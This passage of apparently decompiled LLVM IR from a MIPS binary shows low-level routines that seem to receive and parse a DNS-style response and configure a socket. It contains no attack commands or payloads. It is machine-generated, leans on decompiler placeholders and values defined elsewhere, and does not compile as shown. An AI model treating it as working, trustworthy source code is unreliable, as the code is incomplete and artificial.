  %v3_402dc8 = load i32, i32* %v2_402dc8, align 4
  %v1_402dcc = urem i32 %v0_402dbc, 32
  store i32 %v1_402dcc, i32* %s1.global-to-local, align 4
  %v2_402dd4 = shl i32 1, %v1_402dcc
  %v2_402dd8 = or i32 %v3_402dc8, %v2_402dd4
  store i32 %v2_402dd8, i32* %v1.global-to-local, align 4
  %v3_402ddc = load i32, i32* @global_var_449440.229, align 4
  store i32 %v3_402ddc, i32* @t9, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  store i32 %v2_402dd8, i32* %v2_402dc8, align 4
  %v0_402de8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_402de8, i32* %stack_var_-4296, align 4
  %v0_402df4 = load i32, i32* %s2.global-to-local, align 4
  %v1_402df4 = add i32 %v0_402df4, 1
  store i32 %v1_402df4, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v4_402dfc = call i32 @function_404fa0(i32 %v1_402df4, i32 0, i32 0)
  store i32 %v4_402dfc, i32* %v1.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v2_402e10 = icmp eq i32 %v4_402dfc, -1
  br i1 %v2_402e10, label %dec_label_pc_403040, label %dec_label_pc_402e14

dec_label_pc_402e14:                              ; preds = %dec_label_pc_402db8
  %v1_402e18 = icmp eq i32 %v4_402dfc, 0
  %v2_402e18 = load i32, i32* %s6.global-to-local, align 4
  %v3_402e18 = add i32 %v2_402e18, 1
  store i32 %v3_402e18, i32* %v0.global-to-local, align 4
  br i1 %v1_402e18, label %dec_label_pc_403028, label %dec_label_pc_402e1c

dec_label_pc_402e1c:                              ; preds = %dec_label_pc_402e14
  %v0_402e20 = load i32, i32* @s0, align 4
  %v1_402e20 = add i32 %v0_402e20, 24
  %v2_402e20 = inttoptr i32 %v1_402e20 to i32*
  %v3_402e20 = load i32, i32* %v2_402e20, align 4
  %v1_402e28 = load i32, i32* %s1.global-to-local, align 4
  %tmp68 = shl i32 1, %v1_402e28
  %v1_402e2c29 = and i32 %tmp68, %v3_402e20
  %v1_402e30 = icmp eq i32 %v1_402e2c29, 0
  store i32 %v3_402e18, i32* %v0.global-to-local, align 4
  br i1 %v1_402e30, label %dec_label_pc_403028, label %dec_label_pc_402e34

dec_label_pc_402e34:                              ; preds = %dec_label_pc_402e1c
  %v3_402e38 = load i32, i32* @global_var_44944c.230, align 4
  store i32 %v3_402e38, i32* @t9, align 4
  %v2_402e3c = ptrtoint i16* %stack_var_-2096 to i32
  store i32 %v2_402e3c, i32* %s1.global-to-local, align 4
  store i32 %v2_402e3c, i32* %a1.global-to-local, align 4
  store i32 2048, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v0_402e4c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_402e4c, i32* %a0.global-to-local, align 4
  %v10_402e54 = bitcast i16* %stack_var_-2096 to i32*
  %v11_402e54 = call i32 @function_405a00(i32 %v0_402e4c, i32* %v10_402e54, i32 2048, i32 16384, i32 0, i32 0)
  store i32 %v11_402e54, i32* @v0, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 %v3_402bb8, i32* %a0.global-to-local, align 4
  %v3_402e6c = call i32 @function_40434c(i32 %v3_402bb8)
  %v1_402e74 = add i32 %v3_402e6c, 17
  %v2_402e78 = icmp ult i32 %v11_402e54, %v1_402e74
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v2_402e80 = load i32, i32* %s6.global-to-local, align 4
  %v3_402e80 = add i32 %v2_402e80, 1
  store i32 %v3_402e80, i32* @v0, align 4
  br i1 %v2_402e78, label %dec_label_pc_403028, label %dec_label_pc_402e84

dec_label_pc_402e84:                              ; preds = %dec_label_pc_402e34
  %v2_402e8c = ptrtoint i32* %stack_var_-2084 to i32
  store i32 %v2_402e8c, i32* %s4.global-to-local, align 4
  store i32 %v2_402e8c, i32* %a0.global-to-local, align 4
  %v4_402e90 = call i32 @function_40434c(i32 %v2_402e8c)
  store i32 %v4_402e90, i32* %v0.global-to-local, align 4
  %v3_402e98 = load i16, i16* %stack_var_-2096, align 2
  %v4_402e98 = sext i16 %v3_402e98 to i32
  store i32 %v4_402e98, i32* %v1.global-to-local, align 4
  %v3_402e9c = ptrtoint i32* %stack_var_-2082 to i32
  store i32 %v3_402e9c, i32* %a0.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v1_402ea4 = load i32, i32* @fp, align 4
  %v2_402ea4 = icmp eq i32 %v4_402e98, %v1_402ea4
  %v5_402ea4 = ptrtoint i32* %stack_var_-2077 to i32
  br i1 %v2_402ea4, label %dec_label_pc_402ea8, label %dec_label_pc_403024

dec_label_pc_402ea8:                              ; preds = %dec_label_pc_402e84
  %v1_402eb4 = icmp eq i16 %tmp35, 0
  %v2_402eb4 = load i32, i32* %s6.global-to-local, align 4
  %v3_402eb4 = add i32 %v2_402eb4, 1
  store i32 %v3_402eb4, i32* %v0.global-to-local, align 4
  br i1 %v1_402eb4, label %dec_label_pc_403028, label %dec_label_pc_402eb8

dec_label_pc_402eb8:                              ; preds = %dec_label_pc_402ea8
  %v4_402ebc = zext i16 %tmp34 to i32
  %v1_402ec4 = mul nuw nsw i32 %v4_402ebc, 256
  %v1_402ec8 = and i32 %v1_402ec4, 65280
  %div = udiv i16 %tmp34, 256
  %v1_402ecc = zext i16 %div to i32
  %v2_402ed0 = or i32 %v1_402ec8, %v1_402ecc
  store i32 %v1_402b78, i32* %v1.global-to-local, align 4
  %v2_402edc = icmp eq i32 %v2_402ed0, %v1_402b78
  store i32 %v3_402eb4, i32* @v0, align 4
  br i1 %v2_402edc, label %dec_label_pc_402ee0, label %dec_label_pc_403028

dec_label_pc_402ee0:                              ; preds = %dec_label_pc_402eb8
  store i32 %v5_402ea4, i32* %a0.global-to-local, align 4
  %v4_402eec = call i32 @function_40434c(i32 %v5_402ea4)
  store i32 %v4_402eec, i32* %a2.global-to-local, align 4
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 -65536, i32* %v0.global-to-local, align 4
  store i32 -49152, i32* %a3.global-to-local, align 4
  store i32 %v5_402ea4, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v0_402f10.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_402f10

dec_label_pc_402f10:                              ; preds = %dec_label_pc_402f40, %dec_label_pc_402ee0
  %v0_402f48 = phi i32 [ %v0_402f54, %dec_label_pc_402f40 ], [ 0, %dec_label_pc_402ee0 ]
  %v0_402f28 = phi i32 [ %v2_402f58, %dec_label_pc_402f40 ], [ %v5_402ea4, %dec_label_pc_402ee0 ]
  %v0_402f10 = phi i32 [ %v4_402f58, %dec_label_pc_402f40 ], [ %v0_402f10.pre, %dec_label_pc_402ee0 ]
  %v1_402f10 = inttoptr i32 %v0_402f10 to i8*
  %v2_402f10 = load i8, i8* %v1_402f10, align 1
  %v3_402f10 = zext i8 %v2_402f10 to i32
  %v1_402f18 = mul nuw nsw i32 %v3_402f10, 256
  store i32 %v1_402f18, i32* %v1.global-to-local, align 4
  %v1_402f1c = icmp ult i8 %v2_402f10, -64
  %v2_402f1c = zext i1 %v1_402f1c to i32
  store i32 %v2_402f1c, i32* %v0.global-to-local, align 4
  br i1 %v1_402f1c, label %dec_label_pc_402f40, label %dec_label_pc_402f24

dec_label_pc_402f24:                              ; preds = %dec_label_pc_402f10
  %v1_402f28 = add i32 %v0_402f28, 1
  %v2_402f28 = inttoptr i32 %v1_402f28 to i8*
  %v3_402f28 = load i8, i8* %v2_402f28, align 1
  %v4_402f28 = zext i8 %v3_402f28 to i32
  %v2_402f30 = or i32 %v4_402f28, %v1_402f18
  %v1_402f34 = load i32, i32* %a3.global-to-local, align 4
  %v2_402f34 = add i32 %v2_402f30, %v1_402f34
  %v0_402f38 = load i32, i32* %s1.global-to-local, align 4
  %v2_402f38 = add i32 %v2_402f34, %v0_402f38
  store i32 %v2_402f38, i32* %v0.global-to-local, align 4
  %v1_402f3c = add i32 %v2_402f38, -1
  store i32 %v1_402f3c, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_402f40

dec_label_pc_402f40:                              ; preds = %dec_label_pc_402f10, %dec_label_pc_402f24
  %v0_402f40 = phi i32 [ %v0_402f28, %dec_label_pc_402f10 ], [ %v1_402f3c, %dec_label_pc_402f24 ]
  %v2_402f40 = add i32 %v0_402f40, %v0_402f48
  store i32 %v2_402f40, i32* %v1.global-to-local, align 4
  %v1_402f44 = inttoptr i32 %v2_402f40 to i8*
  %v2_402f44 = load i8, i8* %v1_402f44, align 1
  %v1_402f48 = add i32 %v0_402f48, 1
  store i32 %v1_402f48, i32* %a1.global-to-local, align 4
  %v1_402f4c = add i8 %v2_402f44, 1
  store i8 %v1_402f4c, i8* %v1_402f44, align 1
  %v0_402f54 = load i32, i32* %a1.global-to-local, align 4
  %v1_402f54 = load i32, i32* %a2.global-to-local, align 4
  %v2_402f54 = icmp slt i32 %v0_402f54, %v1_402f54
  %v3_402f54 = zext i1 %v2_402f54 to i32
  store i32 %v3_402f54, i32* %v0.global-to-local, align 4
  %v2_402f58 = load i32, i32* %a0.global-to-local, align 4
  %v4_402f58 = add i32 %v2_402f58, %v0_402f54
  store i32 %v4_402f58, i32* %v1.global-to-local, align 4
  br i1 %v2_402f54, label %dec_label_pc_402f10, label %dec_label_pc_402f5c

dec_label_pc_402f5c:                              ; preds = %dec_label_pc_402f40
  %v2_402f60 = ptrtoint i32* %stack_var_-2065 to i32
  store i32 %v2_402f60, i32* %a1.global-to-local, align 4
  store i32 %v2_402f60, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v4_402f8c = zext i8 %tmp33 to i32
  %v4_402f90 = zext i8 %tmp32 to i32
  %v1_402fa0 = mul nuw nsw i32 %v4_402f90, 256
  %v2_402fa8 = or i32 %v1_402fa0, %v4_402f8c
  %v0_402f74.pre = load i32, i32* %a3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_402f74.pre to i8
  br label %dec_label_pc_402f74

dec_label_pc_402f74:                              ; preds = %dec_label_pc_402f88, %dec_label_pc_402f5c
  %v2_402f74 = phi i32 [ %v1_402f7c, %dec_label_pc_402f88 ], [ %v2_402f60, %dec_label_pc_402f5c ]
  %v0_402f74.off0 = phi i8 [ %v3_402f7c, %dec_label_pc_402f88 ], [ %extract.t28, %dec_label_pc_402f5c ]
  %v3_402f74 = add i32 %v2_402f74, -1
  %v4_402f74 = inttoptr i32 %v3_402f74 to i8*
  store i8 %v0_402f74.off0, i8* %v4_402f74, align 1
  %v0_402f78 = load i32, i32* %a2.global-to-local, align 4
  %v1_402f78 = add i32 %v0_402f78, 1
  store i32 %v1_402f78, i32* %a2.global-to-local, align 4
  %v0_402f7c = load i32, i32* %a0.global-to-local, align 4
  %v1_402f7c = add i32 %v0_402f7c, 1
  %v2_402f7c = inttoptr i32 %v1_402f7c to i8*
  %v3_402f7c = load i8, i8* %v2_402f7c, align 1
  %v4_402f7c = sext i8 %v3_402f7c to i32
  store i32 %v4_402f7c, i32* @a3, align 4
  %v1_402f84 = icmp eq i8 %v3_402f7c, 0
  store i32 %v1_402f7c, i32* %a0.global-to-local, align 4
  br i1 %v1_402f84, label %dec_label_pc_402fb8, label %dec_label_pc_402f88

dec_label_pc_402f88:                              ; preds = %dec_label_pc_402f74
  store i32 %v1_402fa0, i32* %v1.global-to-local, align 4
  %v2_402fac = icmp ult i32 %v1_402f78, %v2_402fa8
  %v3_402fac = zext i1 %v2_402fac to i32
  store i32 %v3_402fac, i32* %v0.global-to-local, align 4
  br i1 %v2_402fac, label %dec_label_pc_402f74, label %dec_label_pc_402fb8

dec_label_pc_402fb8:                              ; preds = %dec_label_pc_402f88, %dec_label_pc_402f74
  %v0_402fb8 = load i32, i32* %a1.global-to-local, align 4
  %v2_402fb8 = add i32 %v0_402fb8, %v1_402f78
  store i32 %v2_402fb8, i32* @v0, align 4
  %v1_402fc0 = inttoptr i32 %v2_402fb8 to i8*
  store i8 0, i8* %v1_402fc0, align 1
  %v0_402fc4 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402fc4, i32* %a0.global-to-local, align 4
  %v1_402fc8 = load i32, i32* %a2.global-to-local, align 4
  %v2_402fc8 = trunc i32 %v1_402fc8 to i8
  %v4_402fc8 = add i32 %v0_402fc4, 261
  %v5_402fc8 = inttoptr i32 %v4_402fc8 to i8*
  store i8 %v2_402fc8, i8* %v5_402fc8, align 1
  %v6_402fc8 = call i32 @function_4043a4()
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v0_402fd4 = load i32, i32* %s6.global-to-local, align 4
  %v1_402fd4 = trunc i32 %v0_402fd4 to i8
  %v2_402fd4 = load i32, i32* %s3.global-to-local, align 4
  %v3_402fd4 = add i32 %v2_402fd4, 260
  %v4_402fd4 = inttoptr i32 %v3_402fd4 to i8*
  store i8 %v1_402fd4, i8* %v4_402fd4, align 1
  %v4_402fd8 = zext i8 %tmp31 to i32
  %v2_402fdc = load i8, i8* %stack_var_-2075, align 1
  %v3_402fdc = sext i8 %v2_402fdc to i32
  %v1_402fe0 = mul nuw nsw i32 %v4_402fd8, 256
  %v2_402fe4 = or i32 %v3_402fdc, %v1_402fe0
  %v1_402fe8 = mul nsw i32 %v3_402fdc, 256
  %v1_402ff0 = udiv i32 %v2_402fe4, 256
  %v2_402ff4 = or i32 %v1_402ff0, %v1_402fe8
  %v1_402ff8 = trunc i32 %v2_402ff4 to i16
  %v2_402ff8 = load i32, i32* %s3.global-to-local, align 4
  %v3_402ff8 = add i32 %v2_402ff8, 256
  %v4_402ff8 = inttoptr i32 %v3_402ff8 to i16*
  store i16 %v1_402ff8, i16* %v4_402ff8, align 2
  %v4_402ffc = zext i8 %tmp30 to i32
  %v4_403000 = zext i8 %tmp to i32
  %v1_403010 = mul nuw nsw i32 %v4_403000, 256
  store i32 %v1_403010, i32* %v1.global-to-local, align 4
  %v2_403018 = or i32 %v1_403010, %v4_402ffc
  store i32 %v2_403018, i32* %v0.global-to-local, align 4
  %v1_403020 = trunc i32 %v2_403018 to i16
  %v2_403020 = load i32, i32* %s3.global-to-local, align 4
  %v3_403020 = add i32 %v2_403020, 258
  %v4_403020 = inttoptr i32 %v3_403020 to i16*
  store i16 %v1_403020, i16* %v4_403020, align 2
  %v0_40305c.pre.pre.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403024

dec_label_pc_403024:                              ; preds = %dec_label_pc_402e84, %dec_label_pc_402fb8
  %v0_40305c.pre.pre = phi i32 [ %v2_402b40, %dec_label_pc_402e84 ], [ %v0_40305c.pre.pre.pre, %dec_label_pc_402fb8 ]
  %v0_403024 = load i32, i32* %s6.global-to-local, align 4
  %v1_403024 = add i32 %v0_403024, 1
  store i32 %v1_403024, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403028

dec_label_pc_403028:                              ; preds = %dec_label_pc_402eb8, %dec_label_pc_402ea8, %dec_label_pc_402e34, %dec_label_pc_402e1c, %dec_label_pc_402e14, %dec_label_pc_403024
  %v0_40305c.pre = phi i32 [ %v2_402b40, %dec_label_pc_402eb8 ], [ %v2_402b40, %dec_label_pc_402ea8 ], [ %v2_402b40, %dec_label_pc_402e34 ], [ %v2_402b40, %dec_label_pc_402e1c ], [ %v2_402b40, %dec_label_pc_402e14 ], [ %v0_40305c.pre.pre, %dec_label_pc_403024 ]
  %v0_403028 = phi i32 [ %v3_402eb4, %dec_label_pc_402eb8 ], [ %v3_402eb4, %dec_label_pc_402ea8 ], [ %v3_402e80, %dec_label_pc_402e34 ], [ %v3_402e18, %dec_label_pc_402e1c ], [ %v3_402e18, %dec_label_pc_402e14 ], [ %v1_403024, %dec_label_pc_403024 ]
  %v1_403028 = urem i32 %v0_403028, 65536
  store i32 %v1_403028, i32* %s6.global-to-local, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_403030 = icmp eq i32 %v1_403028, 11
  br i1 %v2_403030, label %dec_label_pc_40305c, label %dec_label_pc_403040

dec_label_pc_403040:                              ; preds = %dec_label_pc_403028, %dec_label_pc_402db8
  %v0_403040 = phi i32 [ %v2_402b40, %dec_label_pc_402db8 ], [ %v0_40305c.pre, %dec_label_pc_403028 ]
  %v1_403040 = add i32 %v0_403040, -32580
  %v2_403040 = inttoptr i32 %v1_403040 to i32*
  %v3_403040 = load i32, i32* %v2_403040, align 4
  %v1_403048 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_403048, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403040)
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  %v0_403058 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_403058, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40305c

dec_label_pc_40305c:                              ; preds = %dec_label_pc_403028, %dec_label_pc_403040
  %v0_40305c = phi i32 [ %v2_402b40, %dec_label_pc_403040 ], [ %v0_40305c.pre, %dec_label_pc_403028 ]
  %v1_40305c = add i32 %v0_40305c, -32580
  %v2_40305c = inttoptr i32 %v1_40305c to i32*
  %v3_40305c = load i32, i32* %v2_40305c, align 4
  %v1_403064 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_403064, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40305c)
  store i32 %v2_402b40, i32* %gp.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 %v0_402b4c, i32* @fp, align 4
  store i32 %v0_402b6c, i32* @s0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_403028, { 1, 0 }
  uselistorder i32 %v1_403010, { 1, 0 }
  uselistorder i8 %v3_402f7c, { 1, 2, 0 }
  uselistorder i32 %v1_402f7c, { 0, 2, 1 }
  uselistorder i32 %v4_402f58, { 1, 0 }
  uselistorder i32 %v0_402f54, { 0, 2, 1 }
  uselistorder i32 %v1_402f18, { 1, 0 }
  uselistorder i32 %v0_402f48, { 1, 0 }
  uselistorder i32 %v5_402ea4, { 0, 1, 3, 2 }
  uselistorder i32 %v2_402e8c, { 1, 0, 2 }
  uselistorder i32 %v1_402dcc, { 1, 0 }
  uselistorder i32 %v1_402dc0, { 1, 0 }
  uselistorder i32 %v0_402dbc, { 1, 0 }
  uselistorder i32 %v1_402db0, { 1, 2, 0 }
  uselistorder i32 %v4_402d04, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_402cd8, { 1, 0, 2 }
  uselistorder i32 %v1_402b78, { 2, 1, 0 }
  uselistorder i32 %v4_402c28, { 1, 0 }
  uselistorder i32 %v1_402c20, { 0, 2, 3, 1 }
  uselistorder i32 %v1_402c14, { 1, 0 }
  uselistorder i32 %v1_402c08, { 0, 2, 1 }
  uselistorder i32 %v2_402bc4, { 1, 0 }
  uselistorder i32 %v3_402bb8, { 4, 3, 2, 5, 1, 6, 7, 0, 8, 9 }
  uselistorder i32 %v2_402b40, { 20, 7, 19, 6, 1, 2, 3, 4, 5, 0, 25, 24, 23, 22, 21, 18, 17, 16, 15, 27, 26, 14, 28, 13, 12, 11, 10, 9, 8, 29 }
  uselistorder i32* %stack_var_-4288, { 0, 2, 1 }
  uselistorder i16* %stack_var_-2096, { 2, 0, 1 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i8 1, { 0, 1, 3, 2 }
  uselistorder i32 2048, { 1, 2, 0 }
  uselistorder i32 46, { 0, 2, 1 }
  uselistorder label %dec_label_pc_40305c, { 1, 0 }
  uselistorder label %dec_label_pc_403028, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_403024, { 1, 0 }
  uselistorder label %dec_label_pc_402f40, { 1, 0 }
  uselistorder label %dec_label_pc_402d74, { 1, 0 }
  uselistorder label %dec_label_pc_402cf8, { 1, 0 }
}

define i32 @function_4030a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4030a8:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_4030b4 = load i32, i32* bitcast (i32** @global_var_44935c.234 to i32*), align 4
  store i32 %v3_4030b4, i32* %v0.global-to-local, align 4
  %v3_4030b8 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_4030b8, i32* @t9, align 4
  store i32 %v3_4030b4, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  %v5_4030c0 = call i32 @function_404c90(i32 %v3_4030b4, i32 9)
  store i32 %v5_4030c0, i32* %v0.global-to-local, align 4
  %v1_4030d0 = load i32, i32* @t9, align 4
  %v1_4030d4 = urem i32 %arg1, 65536
  %v1_4030d8 = add i32 %v1_4030d0, 287664
  %v2_4030d8 = inttoptr i32 %v1_4030d8 to i32*
  %v3_4030d8 = load i32, i32* %v2_4030d8, align 4
  store i8 9, i8* bitcast (i32* @global_var_44936c.20 to i8*), align 4
  store i32 %v1_4030d4, i32* @global_var_449368.235, align 4
  store i16 0, i16* bitcast (i32* @global_var_44956e.236 to i16*), align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44936e.237 to i32), i32* %a0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_4030d8)
  %v0_40310c = load i32, i32* @s1, align 4
  %v0_403110 = load i32, i32* @s0, align 4
  %v3_403118 = load i32, i32* @global_var_449376.238, align 4
  store i32 %v3_403118, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44936e.237 to i32), i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v1_403124 = add i32 %v3_4030d8, 287124
  %v2_403124 = inttoptr i32 %v1_403124 to i32*
  %v3_403124 = load i32, i32* %v2_403124, align 4
  store i32 %v3_403118, i32* %a0.global-to-local, align 4
  %v0_40312c = load i32, i32* %a1.global-to-local, align 4
  %v1_40312c = trunc i32 %v0_40312c to i8
  store i8 %v1_40312c, i8* bitcast (i32* @global_var_44937e.239 to i8*), align 4
  %v2_403130 = icmp eq i32 %v3_403118, -1
  store i8 0, i8* bitcast (i32* @global_var_44937f.240 to i8*), align 4
  br i1 %v2_403130, label %dec_label_pc_403144, label %dec_label_pc_403134

dec_label_pc_403134:                              ; preds = %dec_label_pc_4030a8
  call void @__pseudo_call(i32 %v3_403124)
  %v0_403144.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_403144

dec_label_pc_403144:                              ; preds = %dec_label_pc_4030a8, %dec_label_pc_403134
  %v0_403144 = phi i32 [ -1, %dec_label_pc_4030a8 ], [ %v0_403144.pre, %dec_label_pc_403134 ]
  store i32 %v0_403144, i32* @global_var_449376.238, align 4
  store i32 0, i32* @global_var_44937a.242, align 4
  store i16 0, i16* bitcast (i32* @global_var_449580.243 to i16*), align 4
  store i32 0, i32* @global_var_449582.244, align 4
  %v1_403154 = add i32 %v3_4030d8, 287616
  %v2_403154 = inttoptr i32 %v1_403154 to i32*
  %v3_403154 = load i32, i32* %v2_403154, align 4
  store i32 ptrtoint (i32* @global_var_449380.4 to i32), i32* %a0.global-to-local, align 4
  store i32 %v0_40310c, i32* %s1.global-to-local, align 4
  store i32 %v0_403110, i32* %s0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_403154)
  %v2_403180 = add i32 %v3_403154, 319576
  store i32 %v2_403180, i32* %stack_var_-40, align 4
  %v1_403198 = add i32 %v3_403154, 287436
  %v2_403198 = inttoptr i32 %v1_403198 to i32*
  %v3_403198 = load i32, i32* %v2_403198, align 4
  %v0_40319c = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_40319c, i32* %s1.global-to-local, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403198)
  %v3_4031b0 = load i32, i32* %stack_var_-40, align 4
  %v0_4031b4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4031b4, i32* %s0.global-to-local, align 4
  store i32 %v0_4031b4, i32* %a0.global-to-local, align 4
  store i32 %v0_4031b4, i32* @global_var_449388.60, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_4031c4 = add i32 %v3_4031b0, -32572
  %v2_4031c4 = inttoptr i32 %v1_4031c4 to i32*
  %v3_4031c4 = load i32, i32* %v2_4031c4, align 4
  store i32 3, i32* %a1.global-to-local, align 4
  %v2_4031cc = icmp eq i32 %v0_4031b4, -1
  br i1 %v2_4031cc, label %dec_label_pc_40324c, label %dec_label_pc_4031d0

dec_label_pc_4031d0:                              ; preds = %dec_label_pc_403144
  store i32 2, i32* %v0.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  call void @__pseudo_call(i32 %v3_4031c4)
  %v3_4031f0 = load i32, i32* %stack_var_-40, align 4
  %v0_4031f4 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_4031f4, i32* %a0.global-to-local, align 4
  %v1_4031f8 = add i32 %v3_4031f0, -32572
  %v2_4031f8 = inttoptr i32 %v1_4031f8 to i32*
  %v3_4031f8 = load i32, i32* %v2_4031f8, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4031f8)
  %v3_403208 = load i32, i32* %stack_var_-40, align 4
  %v0_40320c = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_40320c, i32* %a0.global-to-local, align 4
  %v1_403210 = add i32 %v3_403208, -32736
  %v2_403210 = inttoptr i32 %v1_403210 to i32*
  %v3_403210 = load i32, i32* %v2_403210, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v1_403218 = add i32 %v3_403210, 12488
  call void @__pseudo_call(i32 %v1_403218)
  %v3_403224 = load i32, i32* %stack_var_-40, align 4
  %v3_403228 = load i32, i32* @global_var_449388.60, align 4
  store i32 %v3_403228, i32* %a0.global-to-local, align 4
  %v1_40322c = add i32 %v3_403224, -32020
  %v2_40322c = inttoptr i32 %v1_40322c to i32*
  %v3_40322c = load i32, i32* %v2_40322c, align 4
  store i32 %v3_40322c, i32* %v0.global-to-local, align 4
  %v1_403230 = add i32 %v3_403224, -32040
  %v2_403230 = inttoptr i32 %v1_403230 to i32*
  %v3_403230 = load i32, i32* %v2_403230, align 4
  %v1_403234 = inttoptr i32 %v3_40322c to i32*
  %v2_403234 = load i32, i32* %v1_403234, align 4
  store i32 %v2_403234, i32* %v0.global-to-local, align 4
  %v2_403238 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_403238, i32* %a1.global-to-local, align 4
  store i32 %v2_403234, i32* @global_var_449594.250, align 4
  call void @__pseudo_call(i32 %v3_403230)
  br label %dec_label_pc_40324c

dec_label_pc_40324c:                              ; preds = %dec_label_pc_403144, %dec_label_pc_4031d0
  %v4_403258 = phi i32 [ -1, %dec_label_pc_403144 ], [ %v2_403234, %dec_label_pc_4031d0 ]
  store i32 %v0_40310c, i32* %s1.global-to-local, align 4
  store i32 %v0_403110, i32* %s0.global-to-local, align 4
  ret i32 %v4_403258

; uselistorder directives
  uselistorder i32 %v3_403154, { 0, 2, 1 }
  uselistorder i32 %v3_403118, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder label %dec_label_pc_40324c, { 1, 0 }
  uselistorder label %dec_label_pc_403144, { 1, 0 }
}

define i32 @function_403260(i32 %arg1) local_unnamed_addr {
dec_label_pc_403260:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i16 @__decompiler_undefined_function_2()
  %tmp59 = call i8 @__decompiler_undefined_function_1()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp73 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2920 = alloca i32, align 4
  %stack_var_-2924 = alloca i32, align 4
  %stack_var_-2916 = alloca i32, align 4
  %stack_var_-2596 = alloca i32, align 4
  %stack_var_-2724 = alloca i32, align 4
  %stack_var_-2852 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-2908 = alloca i32, align 4
  %stack_var_-2872 = alloca i16, align 2
  %stack_var_-2928 = alloca i32, align 4
  %stack_var_-2892 = alloca i32, align 4
